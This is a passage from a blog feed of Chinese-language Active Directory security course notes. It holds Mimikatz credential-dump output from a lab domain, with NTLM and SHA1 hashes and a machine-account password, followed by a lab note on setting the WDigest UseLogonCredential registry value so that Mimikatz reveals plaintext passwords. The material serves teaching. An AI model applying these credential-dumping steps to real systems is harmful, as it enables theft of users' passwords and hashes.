+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">70109&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000111dd&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DWM-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Window Manager
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:38
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-90-0-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">996&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e4&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:38
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-20
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : desktop-g95u93t$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">47346&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000b8f2&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : UMFD-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Font Driver Host
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:38
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-96-0-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">46297&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000b4d9&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : UMFD-0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Font Driver Host
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:38
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-96-0-0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">44132&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000ac64&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : UndefinedLogonType from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:37
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : 
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">999&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e7&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : UndefinedLogonType from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:37
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-18
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : desktop-g95u93t$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::
+可以看到這一份檔案比前面提到的SAM還要完整很多，用log的原因是他會把輸出dump下來，用熟悉的文字編輯器尋找有用的資訊比較方便，另外，==Privilege::Debug==的意思是跟windows取得debug lsass的權限&lt;/li>
+&lt;/ol></description></item><item><title>NTUSTISC - AD Note - Lab(顯示Mimikatz的明文)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x19%E9%A1%AF%E7%A4%BAmimikatz%E7%9A%84%E6%98%8E%E6%96%87/</guid><description>&lt;h1 id="ntustisc---ad-note---lab顯示mimikatz的明文">
+ NTUSTISC - AD Note - Lab(顯示Mimikatz的明文)
+ &lt;a class="anchor" href="#ntustisc---ad-note---lab%e9%a1%af%e7%a4%bamimikatz%e7%9a%84%e6%98%8e%e6%96%87">#&lt;/a>
+&lt;/h1>
+&lt;p>[TOC]&lt;/p>
+&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>之前在進行mimikatz的實作時，會看到很多wdigest是(null)的情況，主要原因是windows的設定的問題，所以只要把設定改回來，就可以正常顯示了，主要是windows不主動存取明文密碼&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://www.sohu.com/a/569244434_121124375">What is WDigest&lt;/a>
+&lt;blockquote>
+&lt;p>WDigest即摘要身份驗證，摘要身份驗證是一種質詢/響應協議，主要在WindowsServer2003中用於LDAP和基於Web的身份驗證。它利用超文本傳輸協議(HTTP)和簡單身份驗證安全層(SASL)交換進行身份驗證&lt;/p>&lt;/blockquote>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;p>&lt;a href="https://learn.microsoft.com/zh-tw/windows-server/identity/ad-ds/manage/understand-security-identifiers">什麼是安全性識別碼？&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>安全性識別碼可用來唯一識別安全性主體或安全性群組。 安全性主體可以代表可由作業系統驗證的任何實體，例如使用者帳戶、電腦帳戶，或在使用者或電腦帳戶的安全性內容中執行的執行緒或進程。&lt;/p>
+&lt;p>每個帳戶或群組，或帳戶安全性內容中執行的每個進程，都有由授權單位發出的唯一 SID，例如 Windows 網域控制站。 SID 會儲存在安全性資料庫中。 系統會產生 SID，以識別建立帳戶或群組時的特定帳戶或群組。 當 SID 做為使用者或群組的唯一識別碼時，永遠不會再次用來識別其他使用者或群組。&lt;/p>&lt;/blockquote>
+&lt;h2 id="lab">
+ Lab
+ &lt;a class="anchor" href="#lab">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="顯示mimikatz的明文">
+ ==顯示Mimikatz的明文==
+ &lt;a class="anchor" href="#%e9%a1%af%e7%a4%bamimikatz%e7%9a%84%e6%98%8e%e6%96%87">#&lt;/a>
+&lt;/h3>
+&lt;ol>
+&lt;li>
+&lt;p>只要打開regedit，在&lt;code>電腦\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&lt;/code>可能會看到&lt;code>UseLogonCredential&lt;/code>的名稱，只要把對應的數值改成1就可以了，當然如果沒看到的話也可以自己新增
+&lt;img src="https://hackmd.io/_uploads/BkQAC8ERn.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>重開機
+重開機前可以先把之前mimikatz的結果存起來，照樣之後可以對照著看&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Result
+我挑了幾個SID一樣的結果來看
+&lt;img src="https://hackmd.io/_uploads/HktIkvVA2.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://hackmd.io/_uploads/B1uqyDE02.png" alt="" />
+左邊的是新增config之前，右邊的是重開機之後，可以看到原本(null)的地方大部分都有被顯示出來&lt;/p>
+&lt;/li>
+&lt;/ol></description></item></channel></rss>
